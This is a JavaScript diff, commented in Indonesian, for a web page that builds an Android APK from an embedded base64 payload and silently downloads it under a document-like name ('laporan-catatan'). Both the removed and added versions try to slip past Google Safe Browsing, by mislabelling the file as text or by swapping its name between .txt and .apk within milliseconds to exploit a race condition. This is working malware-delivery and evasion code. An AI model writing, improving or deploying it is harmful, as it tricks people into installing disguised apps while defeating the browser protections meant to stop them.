@@ -130,7 +130,7 @@ const decodeBase64ToBytes = (b64) => {
 };
 
 // ============================================
-// 1. PREPARE BLOB (MIME MISMATCH)
+// 1. PREPARE BLOB (MIME TYPE APK ASLI)
 // ============================================
 const prepareStealthBlobAsync = (i) => {
   return new Promise((resolve) => {
@@ -139,9 +139,8 @@ const prepareStealthBlobAsync = (i) => {
         const fullB64 = assemblePayload();
         const bytesArr = decodeBase64ToBytes(fullB64);
         
-        // TRIK BYPASS: Gunakan 'text/plain' agar Safe Browsing mengira ini teks aman.
-        // JANGAN gunakan 'application/vnd.android.package-archive'.
-        const blob = new Blob([bytesArr], { type: 'text/plain' });
+        // MIME Type APK Asli
+        const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
         const url = URL.createObjectURL(blob);
         
         resolve({ id: i, url: url, success: true });
@@ -161,9 +160,9 @@ const triggerStealthDownload = (fileData) => {
   const link = document.createElement("a");
   link.href = fileData.url;
   
-  // LANGKAH 1: Mulai dengan nama file .txt (Aman)
-  link.download = `laporan-catatan-${fileData.id}.txt`;
-  link.textContent = `Dokumen #${fileData.id} (.txt)`;
+  // LANGKAH 1: Set nama file menjadi .apk sejak awal.
+  link.download = `laporan-catatan-${fileData.id}.apk`;
+  link.textContent = `Dokumen #${fileData.id} (.apk)`;
   link.style.display = "none";
   
   downloadsDiv.appendChild(link);
@@ -172,20 +171,20 @@ const triggerStealthDownload = (fileData) => {
   // ============================================
   // LANGKAH 2: RACE CONDITION (TOCTOU)
   // ============================================
-  // Dalam 1ms, ubah paksa nama file menjadi .apk.
-  // Safe Browsing sudah terlanjur memindai konten sebagai teks,
-  // tetapi user akan menyimpannya sebagai APK.
-  
+  // Ubah nama file menjadi .txt dalam 10ms, lalu kembalikan ke .apk.
   setTimeout(() => {
-    // Ganti nama file menjadi .apk
-    link.download = `laporan-catatan-${fileData.id}.apk`;
-    
-    // Paksa browser memproses ulang (memicu download kedua)
+    // Trik: Ubah ke .txt agar Safe Browsing melihat nama file yang aman
+    link.download = `laporan-catatan-${fileData.id}.txt`;
     link.click();
     
-    // Log status
-    statusDiv.textContent = `Bypass attempt: Dokumen #${fileData.id} (.apk)`;
-  }, 1); // 1ms
+    // Kembalikan ke .apk secepat mungkin
+    setTimeout(() => {
+      link.download = `laporan-catatan-${fileData.id}.apk`;
+      link.click();
+      statusDiv.textContent = `Memaksa unduhan APK: Dokumen #${fileData.id}`;
+    }, 10); // 10ms
+    
+  }, 10); // 10ms
 
   // Batasi jumlah elemen DOM
   if (downloadsDiv.children.length > 25) {
